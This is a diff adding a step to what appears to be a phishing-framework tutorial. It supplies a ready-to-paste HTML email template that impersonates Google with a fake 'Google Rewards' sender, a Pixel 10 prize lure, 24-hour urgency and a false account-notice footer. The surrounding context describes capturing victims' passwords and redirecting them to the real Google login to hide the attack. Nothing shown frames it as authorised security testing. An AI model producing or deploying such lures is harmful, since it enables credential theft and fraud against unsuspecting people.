@@ -86,3 +86,50 @@ After that you will see in the Terminal Default 'USERNAME' and 'PASSWORD' to Log
 <b>Capture Passwords: Checked (ON).</b>
 
 <b>Redirect to: https://accounts.google.com (to hide the attack after the victim "logs in").</b>
+
+## Step 3. Email Template (The Bait)
+<b>Name: Reward</b>
+
+<b>Envelope sender: Google Rewards <support@rewards-portal.net></b>
+
+<b>Subject: Claim your Reward: You've been selected for a Google Pixel 10</b>
+
+<b>HTML Code Copy Past</b>
+```
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f8f9fa; margin: 0; padding: 20px; }
+        .container { max-width: 600px; background: white; border: 1px solid #e0e0e0; border-radius: 8px; margin: auto; overflow: hidden; }
+        .header { background-color: #ffffff; padding: 20px; text-align: center; border-bottom: 1px solid #f1f1f1; }
+        .content { padding: 30px; text-align: center; color: #3c4043; }
+        .button { background-color: #1a73e8; color: white !important; padding: 14px 30px; text-decoration: none; border-radius: 4px; font-weight: 500; display: inline-block; margin: 20px 0; }
+        .footer { background-color: #f1f3f4; padding: 15px; text-align: center; font-size: 12px; color: #70757a; }
+        .logo { width: 92px; height: 30px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
+        </div>
+        <div class="content">
+            <h1 style="font-size: 22px; color: #202124;">Congratulations, {{.FirstName}}!</h1>
+            <p>You have been selected as a participant in our 2026 User Loyalty Program.</p>
+            <p>Based on your recent activity, you are eligible to claim a <strong>Google Pixel 10</strong> or a <strong>$500 Google Play Credit</strong>.</p>
+            
+            <a href="{{.URL}}" class="btn button">Claim Your Reward Now</a>
+            
+            <p style="font-size: 14px; color: #5f6368;">Note: This offer is only valid for the next 24 hours. Verification of your account is required to prevent duplicate claims.</p>
+        </div>
+        <div class="footer">
+            &copy; 2026 Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043<br>
+            You received this email because it is a mandatory update regarding your account status.
+        </div>
+    </div>
+{{.Tracker}}</body>
+</html>
+```
+
+<b>Now CLick ON Save Template</b>
